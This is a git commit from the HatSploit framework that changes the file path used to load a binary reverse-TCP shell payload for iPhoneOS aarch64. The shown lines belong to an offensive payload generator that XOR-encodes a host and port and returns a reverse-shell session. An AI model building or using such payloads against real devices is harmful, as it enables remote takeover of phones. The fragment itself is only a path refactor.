70769e73c280b85ce03149cf6d7ff384516b482f
Ivan Nikolsky <enty8080@gmail.com>
2021-06-23 01:47:08 +0200

    Update pwny_reverse_tcp.py

--- payloads/iphoneos/aarch64/pwny_reverse_tcp.py
+++ payloads/iphoneos/aarch64/pwny_reverse_tcp.py
@@ -77,7 +77,7 @@ class HatSploitPayload(Payload, StringTools, TCPClient):
         local_port = self.xor_string(local_port)
 
         self.output_process("Generating payload...")
-        with open('data/pwny/iphoneos/aarch64/pwny', 'rb') as f:
+        with open(self.data_path + 'pwny/iphoneos/aarch64/pwny', 'rb') as f:
             payload = f.read()
 
         return payload, f"reverse '{local_host}' '{local_port}'", HatSploitSession
